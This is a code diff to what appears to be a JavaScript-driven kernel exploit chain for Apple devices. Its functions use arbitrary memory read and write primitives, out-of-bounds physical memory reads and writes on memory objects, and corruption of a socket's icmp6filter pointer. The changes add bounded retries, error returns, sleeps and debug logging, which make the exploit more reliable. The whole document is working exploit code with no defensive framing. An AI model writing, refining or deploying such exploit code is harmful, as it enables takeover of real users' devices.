@@ -165,9 +165,10 @@
       let utsname = calloc(256n, 5n);
       LOG("[PE-DBG] calloc returned: " + utsname.hex());
       LOG("[PE-DBG] calling uname...");
-      fcall(UNAME, utsname);
-      LOG("[PE-DBG] uname returned");
+      let uname_ret = fcall(UNAME, utsname);
+      LOG("[PE-DBG] uname returned: " + fmt(uname_ret));
       g_device_machine = utsname + 256n * 4n;
+      LOG("[PE-DBG] device_machine pointer set: " + g_device_machine.hex());
     }
     return g_device_machine;
   }
@@ -373,6 +374,7 @@
       if (isFinished == 1n) {
         break;
       }
+      usleep(1000n);
     }
     object_release(nsthread);
     uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
@@ -821,12 +823,14 @@
     return KERN_SUCCESS;
   }
   function physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) {
-    while (true) {
+    for (let attempt = 0; attempt < 500; attempt++) {
       kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
       if (kr == KERN_SUCCESS) {
-        break;
+        return KERN_SUCCESS;
       }
     }
+    LOG("[-] physical_oob_read_mo_with_retry exhausted after 500 attempts");
+    return 1n;
   }
   function physical_oob_write_mo(mo, mo_offset, size, offset, buffer) {
     uwrite64(target_object_sync_ptr, mo);
@@ -1036,7 +1040,10 @@
   }
   function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
     if (do_read == true) {
-      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
+      if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
+        LOG("[-] find_and_corrupt_socket: initial OOB read failed");
+        return -1n;
+      }
     }
     let search_start_idx = 0n;
     let target_found = false;
@@ -1092,7 +1099,10 @@
       LOG("[+] Corrupting icmp6filter pointer...");
       while (true) {
         physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
-        physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
+        if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
+          LOG("[-] find_and_corrupt_socket: re-read after corruption failed");
+          return -1n;
+        }
         let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
         if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
           LOG("[+] target corrupted: " + uread64(read_buffer + pcb_start_offset + icmp6filt_offset).hex());
